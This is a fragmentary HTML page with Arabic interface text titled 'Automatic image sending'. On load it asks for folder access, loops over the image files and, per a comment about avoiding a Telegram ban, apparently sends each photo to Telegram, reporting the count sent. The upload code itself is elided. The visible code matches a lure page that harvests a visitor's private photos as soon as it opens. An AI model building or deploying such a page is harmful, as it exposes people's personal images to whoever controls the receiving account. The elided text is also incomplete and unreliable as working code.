...
<html>
<head>
    <title>إرسال الصور التلقائي</title>
    <style>
...
<div id="status">سيبدأ إرسال الصور عند الضغط على "سماح"</div>
...
async function requestFolderAccess() {
    try {
        ...
        document.getElementById('status').textContent = 'جاري إرسال الصور...';
    ...
    try {
        ...
        for await (const entry of folderHandle.values()) {
            if (entry.kind === 'file' && 
                ...
                // تأخير لتجنب حظر التليجرام
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
        
        document.getElementById('status').className = 'success';
        document.getElementById('status').textContent = `تم إرسال ${imageCount} صورة بنجاح!`;
        
    } catch (error) {
        document.getElementById('status').className = 'error';
        document.getElementById('status').textContent = 'فشل الإرسال: ' + error.message;
    }
}
...
window.addEventListener('DOMContentLoaded', () => {
    requestFolderAccess().catch(console.error);
});
</script>
</body>
</html>
